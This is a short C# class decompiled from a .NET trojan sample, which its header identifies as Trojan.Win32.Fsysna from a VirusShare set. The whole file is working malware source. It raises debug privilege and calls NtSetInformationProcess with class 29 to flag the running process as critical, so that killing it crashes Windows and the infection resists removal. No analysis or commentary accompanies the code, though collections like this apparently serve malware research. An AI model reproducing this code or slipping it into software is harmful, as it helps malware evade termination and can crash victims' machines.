// Decompiled with JetBrains decompiler
// Type: Project_Unamed.CriticalProcess
// Assembly: Project Unnamed, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E14D2CAF-643A-42A5-AF85-1F02787E6112
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.Win32.Fsysna.dkho-1e6991871b0b19bec231c68029dfc8a762f32ed88d5a1aa5b922eb829ff10319.exe

using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace Project_Unamed
{
  public class CriticalProcess
  {
    [DebuggerNonUserCode]
    public CriticalProcess()
    {
    }

    public static void ProtectProcess(bool bProtect)
    {
      Process.EnterDebugMode();
      IntPtr num = IntPtr.Zero;
      if (bProtect)
        num = new IntPtr(29);
      CriticalProcess.NtSetInformationProcess(CriticalProcess.GetCurrentProcess(), 29, new IntPtr(CriticalProcess.VarPtr((object) num)), Marshal.SizeOf((object) num));
      Process.LeaveDebugMode();
    }

    private static int VarPtr(object o) => GCHandle.Alloc(RuntimeHelpers.GetObjectValue(o), GCHandleType.Pinned).AddrOfPinnedObject().ToInt32();

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    [DllImport("ntdll.dll")]
    private static extern IntPtr NtSetInformationProcess(
      [In] IntPtr ProcessHandle,
      [In] int ProcessInformationClass,
      [In] IntPtr ProcessInformation,
      [In] int ProcessInformationLength);
  }
}
